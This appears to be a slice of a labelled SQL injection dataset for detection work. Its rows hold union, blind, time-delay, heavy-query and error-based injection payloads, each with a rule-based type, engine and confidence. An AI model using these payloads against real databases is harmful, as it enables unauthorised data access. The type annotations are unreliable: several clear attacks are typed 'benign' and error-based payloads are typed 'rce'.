row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8640,-8760 ) where 8277 = 8277 union all select 8277--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8641,"1"" ) where 1024 = 1024 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
8642,"1', ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8643,"1"" or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""utzr"" like ""utzr",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
8644,"1"" ) as ebvt where 5305 = 5305",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8645,-4055' ) ) as yoez where 3816 = 3816 or ( 8459 = 8459 ) *4906--,1,,boolean_blind,generic,0.95,3816 = 3816 or detected — boolean_blind injection (priority 8) on generic,rule-based
8646,"1 ) ) ) union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8647,"1%"" ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
8648,"1'+ ( select 'hoqt' where 4877 = 4877 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
8649,select sleep ( 5 ) and ( 'vwmx' = 'vwmx,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8650,1' ) ) ),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
8651,"1%"" and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8652,"1 ) ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8653,"1"" where 5216 = 5216 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
8654,"1'|| ( select 'neqi' where 6873 = 6873 union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8655,-5268' ) where 5615 = 5615 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,,boolean_blind,generic,0.95,5615 = 5615 or detected — boolean_blind injection (priority 8) on generic,rule-based
8656,1' ) as xbsc where 6772 = 6772,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8657,"1 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- lxey",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
8658,select sleep ( 5 ) and 'yzix' = 'yzix,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8659,1'+ ( select 'hhnz' where 2465 = 2465,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8660,1'|| ( select 'kzkr' from dual where 2778 = 2778,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8661,"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""opdl"" = ""opdl",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8662,"select count ( * ) from generate_series ( 1,5000000 ) and ""ihbe"" like ""ihbe",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
8663,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'lbwh' = 'lbwh",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8664,"1%"" and sleep ( 5 ) and ""%"" = """,1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
8665,"-2125"" ) ) or 8571 = 8571--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8666,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) # tsxs",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8667,"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""ekjs"" like ""ekjs",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
